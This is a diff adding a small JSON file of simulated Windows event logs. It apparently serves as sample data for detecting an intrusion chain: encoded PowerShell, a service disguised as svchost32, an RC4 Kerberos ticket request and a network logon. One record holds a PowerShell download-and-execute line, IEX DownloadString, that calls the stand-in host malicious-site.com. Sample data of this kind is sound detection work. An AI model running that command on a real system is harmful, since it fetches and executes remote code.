@@ -1,0 +1,7 @@
+[
+  {"event_id": 4688, "source": "Security", "message": "New process: powershell.exe -enc SQBFAFgA", "host": "WS01", "user": "jsmith", "ts": "2026-05-31T02:19:01Z"},
+  {"event_id": 4104, "source": "PowerShell/Operational", "message": "ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.exe')", "host": "WS01", "user": "jsmith", "ts": "2026-05-31T02:19:05Z"},
+  {"event_id": 7045, "source": "System", "message": "Service installed: svchost32 binPath=C:\\\\ProgramData\\\\svchost32.exe", "host": "SRV02", "user": "SYSTEM", "ts": "2026-05-31T03:02:00Z"},
+  {"event_id": 4769, "source": "Security", "message": "Kerberos service ticket requested for SPN MSSQLSvc, encryption 0x17 (RC4)", "host": "DC01", "user": "svc-sql", "ts": "2026-05-31T03:40:00Z"},
+  {"event_id": 4624, "source": "Security", "message": "Logon type 3 from 10.0.0.5", "host": "SRV02", "user": "administrator", "ts": "2026-05-31T03:05:00Z"}
+]
